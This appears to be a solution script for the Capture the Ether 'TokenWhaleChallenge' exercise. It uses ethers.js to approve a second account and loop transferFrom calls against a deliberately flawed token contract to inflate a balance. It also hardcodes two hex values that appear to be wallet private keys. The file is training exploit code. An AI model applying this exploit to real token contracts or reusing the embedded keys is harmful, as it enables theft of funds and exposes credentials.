/*
 * @Author: Soingjeang
 * @Date: 2022-07-21 19:14:50
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-25 18:56:19
 * @FilePath: \CapTheEther\src\math\3_2_TokenWhaleChallenge.js
 */
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/TokenWhaleChallenge.json'; // fill
const ctfAbi = './build/contracts/TokenWhaleChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "" // fill
const contractChallangeAddress = "0x53b9eeD58af2883362d58008fcF827272509244c" // fill
const menCount = "0xc160349854efcc1a7b6a55fc4b8df866a06d808d2a80fab80d71c421f743851b"
const otherCount = "0x1eb142ab35a0bf7ec1bc655e6a7629bdd06db3353517466cc3403097764521d7"

let provider = utils.getNetProvider("3")
var MainAddress
var OtherAddress

async function Approve(contractChallenge, walletMen) {
    const appCount = 2000000
    // main coutn  approve other
    console.log(walletMen.address)

    await contractChallenge.approve(OtherAddress.toString(), appCount, {gasLimit:1000000})
    console.log("approve over")
}

async function Transfer(contractChallenge) {
    var i = 1
    var appCount = 1000000
    var appHave = 1000

    var preBlock = await provider.getBlockNumber();
    var newBlock = await provider.getBlockNumber();
    while (appCount >= 1000) {
        if(newBlock > preBlock) {
            await contractChallenge.transferFrom(MainAddress, MainAddress, appHave, {gasLimit:1000000})
            console.log("transfer " + i, "Block last " + newBlock)
            i++
            appCount = appCount-appHave
            appHave = appHave + appHave
            await utils.sleep(100)
            preBlock = newBlock
        }
        newBlock = await provider.getBlockNumber();
    }
    
    console.log("uess me success")
}

async function doApprove() {
    getOtherAddress()
    console.log(OtherAddress)
    let wallet = utils.getMnemonicWallet(mnemonicFile)
    // let wallet = new ethers.Wallet(menCount)
    MainAddress = wallet.address

    let contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
    // let contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    // console.log(contract)
    
    await Approve(contractChall, wallet)
}

function getOtherAddress() {
    let wallet = utils.getPriKeyWallet(secrteFile)
    // let wallet = new ethers.Wallet(otherCount)
    OtherAddress = wallet.address
}

async function doTransfer() {
    let wallet = utils.getPriKeyWallet(secrteFile)
    // let wallet = new ethers.Wallet(menCount)

    let contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
    let contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)

    await Transfer(contractChall)
}

doApprove()
doTransfer()